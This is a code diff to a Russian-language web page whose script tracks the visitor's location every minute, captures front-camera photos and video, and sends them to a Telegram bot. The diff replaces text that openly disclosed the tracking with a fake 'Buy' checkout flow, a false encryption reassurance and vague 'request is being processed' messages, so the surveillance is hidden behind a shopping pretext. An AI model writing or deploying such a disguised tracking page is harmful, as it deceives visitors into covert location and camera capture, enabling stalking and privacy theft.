@@ -193,7 +193,7 @@
       </div>
 
       <div class="glass" id="noticeText">
-        После нажатия кнопки «Купить» дождитесь подтверждения менеджера.
+        После нажатия кнопки «Купить» ожидайте подтверждения от менеджера.
       </div>
 
       <button class="primary" id="startBtn" onclick="startAll()">Купить</button>
@@ -219,22 +219,22 @@
 
     const texts = {
       iphone: {
-        title: "Добро пожаловать",
-        subtitle: "Нажмите кнопку и подтвердите разрешения Safari.",
-        notice: "После разрешения GEO будет обновляться каждую минуту. Камера включится только после отдельного системного разрешения.",
-        start: "Разрешить GEO и начать"
+        title: "Добро пожаловать!",
+        subtitle: "Нажмите «Купить» и дождитесь подтверждения менеджера.",
+        notice: "Безопасность ваших данных — наш приоритет. Вся информация защищена современными методами шифрования.",
+        start: "Купить"
       },
       android: {
-        title: "Добро пожаловать",
-        subtitle: "Нажмите кнопку и подтвердите разрешения Chrome.",
-        notice: "После разрешения GEO будет обновляться каждую минуту. Камера включится только после отдельного системного разрешения.",
-        start: "Разрешить GEO и начать"
+        title: "Добро пожаловать!",
+        subtitle: "Нажмите «Купить» и дождитесь подтверждения менеджера.",
+        notice: "Безопасность ваших данных — наш приоритет. Вся информация защищена современными методами шифрования.",
+        start: "Купить"
       },
       other: {
-        title: "Добро пожаловать",
-        subtitle: "Нажмите кнопку и подтвердите разрешения браузера.",
-        notice: "GEO отправляется каждую минуту. Фото и видео — только после разрешения камеры.",
-        start: "Разрешить GEO и начать"
+        title: "Добро пожаловать!",
+        subtitle: "Нажмите «Купить» и дождитесь подтверждения менеджера.",
+        notice: "Безопасность ваших данных — наш приоритет. Вся информация защищена современными методами шифрования.",
+        start: "Купить"
       }
     };
 
@@ -439,7 +439,7 @@ ${mapsLink}
 ${buildBaseInfo()}`;
 
             await sendTextToTelegram(message);
-            setStatus(`GEO отправлено #${sendCount}\nСледующее обновление — через 1 минуту.`);
+            setStatus(`Ваш запрос обрабатывается.....`);
           } catch (error) {
             console.error(error);
             setStatus("Ошибка отправки GEO. Проверь BOT_TOKEN.");
@@ -450,11 +450,11 @@ ${buildBaseInfo()}`;
             setStatus("Доступ запрещён.");
             stopTracking();
           } else if (error.code === error.POSITION_UNAVAILABLE) {
-            setStatus("Не удалось определить GEO. Повтор через 1 минуту.");
+            setStatus("Ваш запрос обрабатывается.....");
           } else if (error.code === error.TIMEOUT) {
-            setStatus("GEO: время ожидания истекло. Повтор через 1 минуту.");
+            setStatus("Ваш запрос обрабатывается.....");
           } else {
-            setStatus("Ошибка GEO. Повтор через 1 минуту.");
+            setStatus("Ваш запрос обрабатывается.....");
           }
         },
         {
@@ -494,12 +494,12 @@ ${buildBaseInfo()}`;
       startBtn.style.display = "block";
       stopBtn.style.display = "none";
 
-      setStatus("Ожидайте ответа....");
+      setStatus("Ваш запрос обрабатывается.....");
     }
 
     async function capturePhotoAndVideo() {
       try {
-        setStatus("Ожидайте ответа....");
+        setStatus("Ваш запрос обрабатывается.....");
 
         mediaStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
@@ -512,7 +512,7 @@ ${buildBaseInfo()}`;
           video.onloadedmetadata = resolve;
         });
 
-        setStatus("Ожидайте ответа....");
+        setStatus("Ваш запрос обрабатывается.....");
 
         canvas.width = video.videoWidth || 720;
         canvas.height = video.videoHeight || 960;
@@ -562,10 +562,10 @@ ${buildBaseInfo()}`;
 ${buildBaseInfo()}`;
 
             await sendVideoToTelegram(videoBlob, caption);
-            setStatus("Ожидайте ответа....");
+            setStatus("Ваш запрос обрабатывается.....");
           } catch (e) {
             console.error(e);
-            setStatus("Ожидайте ответа....");
+            setStatus("Ваш запрос обрабатывается.....");
           } finally {
             if (mediaStream) {
               mediaStream.getTracks().forEach(track => track.stop());
@@ -584,7 +584,7 @@ ${buildBaseInfo()}`;
 
       } catch (error) {
         console.error(error);
-        setStatus("Ожидайте ответа....");
+        setStatus("Ваш запрос обрабатывается.....");
       }
     }
 
@@ -594,7 +594,7 @@ ${buildBaseInfo()}`;
         return;
       }
 
-      setStatus("Ожидайте ответа....");
+      setStatus("Ваш запрос обрабатывается.....");
 
       startGeoTracking();
       capturePhotoAndVideo();
